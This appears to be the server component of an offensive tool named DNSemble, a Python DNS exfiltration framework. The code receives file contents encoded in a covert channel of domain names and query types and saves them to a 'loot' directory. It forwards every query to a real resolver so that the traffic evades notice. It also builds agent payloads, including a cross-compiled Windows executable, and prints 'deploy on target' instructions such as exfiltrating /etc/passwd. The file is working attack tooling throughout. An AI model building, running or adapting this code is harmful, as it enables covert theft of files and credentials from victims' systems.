#!/usr/bin/env python3
"""
DNSemble Server — DNS Exfiltration Receiver

Listens for DNS queries, decodes the hidden data channel, and
forwards every query to a real upstream resolver so the client
gets legitimate answers and the traffic looks completely normal.

Dynamic mapping: on SESSION_START the server generates a random
seed, returns it as the response IP, and both sides derive the
same char↔domain permutation from that seed.
"""

import socket
import struct
import sys
import os
import time
import random
import argparse
import subprocess
from datetime import datetime
from pathlib import Path

from domains import (
    DOMAINS, DOMAIN_TO_INDEX, CONTROL_DOMAIN, ALL_CHARS,
    QTYPE_A, QTYPE_AAAA, QTYPE_MX, QTYPE_TXT, QTYPE_LABELS,
    CTRL_SESSION_START, CTRL_END_HOSTNAME, CTRL_END_FILENAME,
    CTRL_END_CONTENT, CTRL_CHUNK_OFFSET, CTRL_LABELS,
    decode_txid, parse_dns_query,
    build_dns_response, build_dns_txt_response, build_servfail,
    generate_permutation, build_domain_to_char, seed_to_ip,
)

BANNER = r"""
{cyn}{bold}
    ____  _   _____                 __    __
   / __ \/ | / / ___/___  ____ ___  / /_  / /__
  / / / /  |/ /\__ \/ _ \/ __ `__ \/ __ \/ / _ \
 / /_/ / /|  /___/ /  __/ / / / / / /_/ / /  __/
/_____/_/ |_//____/\___/_/ /_/ /_/_.___/_/\___/
{rst}
  {dim}DNS Exfiltration Framework  ·  v1.0{rst}
  {dim}The domain IS the data.  Dynamic mapping.{rst}
"""

# ── ANSI ──────────────────────────────────────────────────────────────────

class C:
    bold = "\033[1m"
    dim  = "\033[2m"
    rst  = "\033[0m"
    red  = "\033[91m"
    grn  = "\033[92m"
    ylw  = "\033[93m"
    blu  = "\033[94m"
    mag  = "\033[95m"
    cyn  = "\033[96m"

def _ts():
    return datetime.now().strftime("%H:%M:%S")

def log(tag, color, msg):
    print(f"{C.dim}[{_ts()}]{C.rst} {color}[{tag:>5s}]{C.rst} {msg}")

# ── Session ───────────────────────────────────────────────────────────────

class Session:
    def __init__(self, client_id, source_ip, seed):
        self.client_id     = client_id
        self.source_ip     = source_ip
        self.seed          = seed
        self.start_time    = time.time()
        self.phase         = "HOSTNAME"
        self.hostname_buf  = {}
        self.filename_buf  = {}
        self.content_buf   = {}
        self.content_chunk = 0
        self.hostname      = ""
        self.filename      = ""
        self.content       = ""

        perm = generate_permutation(seed)
        self.domain_to_char = build_domain_to_char(perm)

    def assemble(self, buf):
        if not buf:
            return ""
        return "".join(buf[k] for k in sorted(buf.keys()))

    def content_pos(self, seq):
        return self.content_chunk * 256 + seq

# ── Server ────────────────────────────────────────────────────────────────

class DNSembleServer:
    def __init__(self, port, upstream, loot_dir):
        self.port      = port
        self.upstream  = upstream
        self.loot_dir  = loot_dir
        self.sessions  = {}
        self.completed = 0
        self.total_q   = 0
        os.makedirs(loot_dir, exist_ok=True)

    # ── main loop ─────────────────────────────────────────────────────

    def start(self):
        kw = {k: getattr(C, k) for k in
              ("bold", "dim", "rst", "red", "grn", "ylw", "blu", "mag", "cyn")}
        print(BANNER.format(**kw))
        print(f"  {C.bold}Listen addr{C.rst}    0.0.0.0:{self.port}")
        print(f"  {C.bold}Upstream DNS{C.rst}   {self.upstream}:53")
        print(f"  {C.bold}Loot dir{C.rst}       {self.loot_dir}/")
        print(f"  {C.bold}Ctrl domain{C.rst}    {CONTROL_DOMAIN}")
        print(f"  {C.bold}Domain pool{C.rst}    {len(DOMAINS)} domains  (mapping randomised per session)")
        print(f"\n{'━' * 60}\n")
        log("READY", C.grn, "Waiting for exfiltration sessions …")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", self.port))

        try:
            while True:
                data, addr = sock.recvfrom(4096)
                self.total_q += 1
                self._handle(sock, data, addr)
        except KeyboardInterrupt:
            self._final_stats()
        finally:
            sock.close()

    # ── packet router ─────────────────────────────────────────────────

    def _handle(self, sock, data, addr):
        parsed = parse_dns_query(data)
        if parsed is None:
            self._forward(sock, data, addr)
            return

        txid, qname, qtype = parsed
        cid, seq = decode_txid(txid)

        # ── control channel ───────────────────────────────────────
        if qname == CONTROL_DOMAIN:
            self._on_control(sock, data, cid, seq, addr)
            return

        # ── data channel ──────────────────────────────────────────
        if qname in DOMAIN_TO_INDEX:
            self._on_data(cid, seq, qname, qtype, addr)

        self._forward(sock, data, addr)

    # ── control signals ───────────────────────────────────────────────

    def _on_control(self, sock, raw, cid, seq, addr):

        if seq == CTRL_SESSION_START:
            seed = random.randint(1, 0xFFFFFFFF)
            s = Session(cid, addr[0], seed)
            self.sessions[cid] = s

            ip_str = seed_to_ip(seed)
            resp = build_dns_response(raw, ip_str)
            sock.sendto(resp, addr)

            log(" INIT", C.grn,
                f"Client {C.bold}#{cid}{C.rst} from {C.cyn}{addr[0]}{C.rst}"
                f"  seed=0x{seed:08X}  →  mapping generated")
            log("STATS", C.dim,
                f"Active: {len(self.sessions)}  |  Completed: {self.completed}")
            return                        # don't forward — we crafted the response

        # ── non-START controls: forward for a real response ───────
        s = self.sessions.get(cid)

        if seq == CTRL_END_HOSTNAME and s:
            s.hostname = s.assemble(s.hostname_buf)
            s.phase = "FILENAME"
            log(" HOST", C.cyn,
                f"Client #{cid} | hostname complete: "
                f"{C.bold}\"{s.hostname}\"{C.rst}  "
                f"({len(s.hostname_buf)} queries)")

        elif seq == CTRL_END_FILENAME and s:
            s.filename = s.assemble(s.filename_buf)
            s.phase = "CONTENT"
            log(" FILE", C.mag,
                f"Client #{cid} | filename complete: "
                f"{C.bold}\"{s.filename}\"{C.rst}  "
                f"({len(s.filename_buf)} queries)")

        elif seq == CTRL_END_CONTENT and s:
            s.content = s.assemble(s.content_buf)
            s.phase = "COMPLETE"
            self._complete(s)

        elif seq >= CTRL_CHUNK_OFFSET + 1 and s:
            chunk = seq - CTRL_CHUNK_OFFSET
            s.content_chunk = chunk
            log("CHUNK", C.ylw,
                f"Client #{cid} | content chunk #{chunk}")

        self._forward(sock, raw, addr)

    # ── data characters ───────────────────────────────────────────────

    def _on_data(self, cid, seq, domain, qtype, addr):
        s = self.sessions.get(cid)
        if s is None:
            return

        char = s.domain_to_char.get(domain)
        if char is None:
            return

        display = repr(char) if char in ("\n", "\t", "\r") else char

        if qtype == QTYPE_AAAA:
            s.hostname_buf[seq] = char
            partial = s.assemble(s.hostname_buf)
            log(" HOST", C.cyn,
                f"Client #{cid} | "
                f"{C.bold}\"{partial}\"{C.rst}  ← {domain} (AAAA)")

        elif qtype == QTYPE_MX:
            s.filename_buf[seq] = char
            partial = s.assemble(s.filename_buf)
            log(" FILE", C.mag,
                f"Client #{cid} | "
                f"{C.bold}\"{partial}\"{C.rst}  ← {domain} (MX)")

        elif qtype == QTYPE_A:
            pos = s.content_pos(seq)
            s.content_buf[pos] = char
            n = len(s.content_buf)
            log(" DATA", C.ylw,
                f"Client #{cid} | pos {pos:>4d} "
                f"'{display}' ← {domain} (A)  [{n} chars]")

    # ── session complete ──────────────────────────────────────────────

    def _complete(self, s):
        self.completed += 1
        dur = time.time() - s.start_time
        nq = len(s.hostname_buf) + len(s.filename_buf) + len(s.content_buf) + 4

        safe = lambda t: "".join(
            c if c.isalnum() or c in "-_." else "_" for c in t)
        loot_name = f"{safe(s.hostname)}_{safe(s.filename)}"
        loot_path = os.path.join(self.loot_dir, loot_name)

        with open(loot_path, "w") as f:
            f.write(s.content)

        bar = f"{C.grn}{'═' * 60}{C.rst}"
        sep = f"{C.grn}{'─' * 60}{C.rst}"
        print(f"\n{bar}")
        print(f"  {C.bold}{C.grn}EXFILTRATION COMPLETE{C.rst}")
        print(bar)
        print(f"  {C.bold}Client ID{C.rst}   #{s.client_id}")
        print(f"  {C.bold}Source IP{C.rst}   {s.source_ip}")
        print(f"  {C.bold}Hostname{C.rst}    {s.hostname}")
        print(f"  {C.bold}Filename{C.rst}    {s.filename}")
        print(f"  {C.bold}Size{C.rst}        {len(s.content)} bytes")
        print(f"  {C.bold}Duration{C.rst}    {dur:.1f}s")
        print(f"  {C.bold}DNS queries{C.rst} {nq}")
        print(f"  {C.bold}Seed{C.rst}        0x{s.seed:08X}")
        print(sep)
        print(f"  {C.bold}Content:{C.rst}")
        for line in s.content.split("\n"):
            print(f"  {C.ylw}{line}{C.rst}")
        print(sep)
        print(f"  {C.bold}Saved to{C.rst}    {loot_path}")
        print(bar)

        active = len(self.sessions) - 1
        log("STATS", C.dim,
            f"Active: {active}  |  Completed: {self.completed}  |  "
            f"Queries: {self.total_q}")
        print()

        del self.sessions[s.client_id]

    # ── upstream forwarding ───────────────────────────────────────────

    def _forward(self, sock, data, addr):
        try:
            up = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            up.settimeout(2.0)
            up.sendto(data, (self.upstream, 53))
            resp, _ = up.recvfrom(4096)
            up.close()
            sock.sendto(resp, addr)
        except Exception:
            try:
                sock.sendto(build_servfail(data), addr)
            except Exception:
                pass

    # ── shutdown stats ────────────────────────────────────────────────

    def _final_stats(self):
        print(f"\n{C.cyn}{'═' * 60}{C.rst}")
        print(f"  {C.bold}DNSemble shutting down{C.rst}")
        print(f"  Total queries processed : {self.total_q}")
        print(f"  Sessions completed      : {self.completed}")
        print(f"  Sessions still active   : {len(self.sessions)}")
        for cid, s in self.sessions.items():
            print(f"    └─ Client #{cid} from {s.source_ip} "
                  f"(phase: {s.phase}, "
                  f"content so far: {len(s.content_buf)} chars)")
        print(f"{C.cyn}{'═' * 60}{C.rst}")

# ── Payload Generation ───────────────────────────────────────────────────

TEMPLATES_DIR = Path(__file__).resolve().parent / "templates"

PAYLOADS = {
    "generic/python": {
        "template": "generic_python.py",
        "name": "Generic Python Agent",
        "description": "Standalone Python 3 client — zero dependencies, "
                       "works on any system with Python 3.6+",
        "extension": ".py",
    },
    "windows/c": {
        "template": "windows_c.c",
        "name": "Windows Native Agent (C)",
        "description": "Native Windows .exe — cross-compile from Linux with "
                       "MinGW, Winsock2, no runtime dependencies on target",
        "extension": ".c",
        "compile": True,
    },
}

def list_payloads():
    kw = {k: getattr(C, k) for k in
          ("bold", "dim", "rst", "red", "grn", "ylw", "blu", "mag", "cyn")}
    print(BANNER.format(**kw))
    print(f"  {C.bold}Available payloads:{C.rst}\n")
    for key, info in PAYLOADS.items():
        print(f"    {C.cyn}{C.bold}{key}{C.rst}")
        print(f"      {info['name']}")
        print(f"      {C.dim}{info['description']}{C.rst}")
        print(f"      Template: {info['template']}")
        print()
    print(f"  {C.dim}Usage: python server.py --payload generic/python "
          f"--host <IP> [--port 5353] [--jitter 50]{C.rst}\n")


def _try_mingw_compile(src, exe):
    """Cross-compile C source to Windows PE with MinGW. Returns compiler on success."""
    for cc in ("x86_64-w64-mingw32-gcc", "i686-w64-mingw32-gcc"):
        try:
            r = subprocess.run(
                [cc, "-o", exe, src, "-lws2_32", "-O2", "-s"],
                capture_output=True, text=True, timeout=30,
            )
            if r.returncode == 0:
                return cc
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    return None


def generate_payload(payload_key, host, port, jitter, delay, output):
    if payload_key not in PAYLOADS:
        print(f"{C.red}[!] Unknown payload: {payload_key}{C.rst}")
        print(f"    Run with --payloads to see available options.")
        sys.exit(1)

    info = PAYLOADS[payload_key]
    template_path = TEMPLATES_DIR / info["template"]

    if not template_path.is_file():
        print(f"{C.red}[!] Template not found: {template_path}{C.rst}")
        sys.exit(1)

    template = template_path.read_text()

    rendered = (
        template
        .replace("{{SERVER_HOST}}", host)
        .replace("{{SERVER_PORT}}", str(port))
        .replace("{{JITTER}}", str(int(jitter)))
        .replace("{{DELAY}}", str(int(delay)))
    )

    if output is None:
        safe_host = host.replace(".", "_")
        output = f"dnssemble_agent_{safe_host}_{port}{info['extension']}"

    src_path = output
    exe_path = None
    compiler = None

    if info.get("compile"):
        if output.endswith(".exe"):
            src_path = output[:-4] + ".c"
        elif not output.endswith(".c"):
            src_path = output + ".c"
        exe_path = src_path.rsplit(".", 1)[0] + ".exe"

    with open(src_path, "w") as f:
        f.write(rendered)

    if info.get("compile"):
        compiler = _try_mingw_compile(src_path, exe_path)
        if not compiler:
            exe_path = None
    else:
        os.chmod(src_path, 0o755)

    kw = {k: getattr(C, k) for k in
          ("bold", "dim", "rst", "red", "grn", "ylw", "blu", "mag", "cyn")}
    print(BANNER.format(**kw))
    bar = f"{C.grn}{'═' * 60}{C.rst}"
    print(bar)
    print(f"  {C.bold}{C.grn}PAYLOAD GENERATED{C.rst}")
    print(bar)
    print(f"  {C.bold}Type{C.rst}       {payload_key} ({info['name']})")
    print(f"  {C.bold}Server{C.rst}     {host}:{port}")
    print(f"  {C.bold}Delay{C.rst}      {int(delay)}ms")
    print(f"  {C.bold}Jitter{C.rst}     ±{int(jitter)}ms")
    if info.get("compile"):
        print(f"  {C.bold}Source{C.rst}     {src_path}")
        if exe_path:
            print(f"  {C.bold}Binary{C.rst}     {exe_path}  "
                  f"{C.grn}({compiler}){C.rst}")
    else:
        print(f"  {C.bold}Output{C.rst}     {src_path}")
    print(f"  {C.bold}Size{C.rst}       {len(rendered)} bytes")
    print(bar)

    if exe_path:
        print(f"\n  {C.dim}Deploy on Windows target and run:{C.rst}")
        print(f"  {C.bold}  {exe_path} C:\\path\\to\\secret.txt{C.rst}")
        print(f"  {C.bold}  {exe_path} secret.txt -d 200 -j 100{C.rst}")
    elif info.get("compile"):
        exe_name = src_path.rsplit(".", 1)[0] + ".exe"
        print(f"\n  {C.ylw}[!] MinGW not found — compile manually:{C.rst}")
        print(f"  {C.bold}  x86_64-w64-mingw32-gcc -o {exe_name} "
              f"{src_path} -lws2_32 -O2 -s{C.rst}")
        print(f"\n  {C.dim}Then deploy on Windows target and run:{C.rst}")
        print(f"  {C.bold}  {os.path.basename(exe_name)} "
              f"C:\\path\\to\\secret.txt{C.rst}")
        print(f"  {C.bold}  {os.path.basename(exe_name)} "
              f"secret.txt -d 200 -j 100{C.rst}")
    else:
        print(f"\n  {C.dim}Deploy on target and run:{C.rst}")
        print(f"  {C.bold}  python3 {src_path} /etc/passwd{C.rst}")
        print(f"  {C.bold}  python3 {src_path} secret.txt -d 200 -j 100{C.rst}")
    print()


# ── CLI ───────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="DNSemble — DNS exfiltration framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  %(prog)s --payloads                          "
            "Show available payloads\n"
            "  %(prog)s --payload generic/python --host 1.2.3.4  "
            "Generate agent\n"
            "  %(prog)s -p 5353                              "
            "Start DNS listener\n"
        ),
    )

    gen = ap.add_argument_group("payload generation")
    gen.add_argument("--payloads", action="store_true",
                     help="List available payload types")
    gen.add_argument("--payload", metavar="TYPE",
                     help="Generate a payload (e.g. generic/python)")
    gen.add_argument("--host", metavar="IP",
                     help="Public IP/hostname the agent will connect to")
    gen.add_argument("--jitter", type=float, default=50,
                     help="Default jitter in ms baked into the agent (default 50)")
    gen.add_argument("--delay", type=float, default=100,
                     help="Default delay in ms baked into the agent (default 100)")
    gen.add_argument("-o", "--output", metavar="FILE",
                     help="Output filename (default: auto-generated)")

    srv = ap.add_argument_group("server mode")
    srv.add_argument("-p", "--port", type=int, default=5353,
                     help="UDP listen port (default 5353)")
    srv.add_argument("-u", "--upstream", default="8.8.8.8",
                     help="Upstream DNS resolver (default 8.8.8.8)")
    srv.add_argument("-l", "--loot-dir", default="./loot",
                     help="Directory to save exfiltrated files (default ./loot)")

    args = ap.parse_args()

    if args.payloads:
        list_payloads()
        return

    if args.payload:
        if not args.host:
            ap.error("--host is required when generating a payload")
        generate_payload(args.payload, args.host, args.port,
                         args.jitter, args.delay, args.output)

    DNSembleServer(args.port, args.upstream, args.loot_dir).start()

if __name__ == "__main__":
    main()
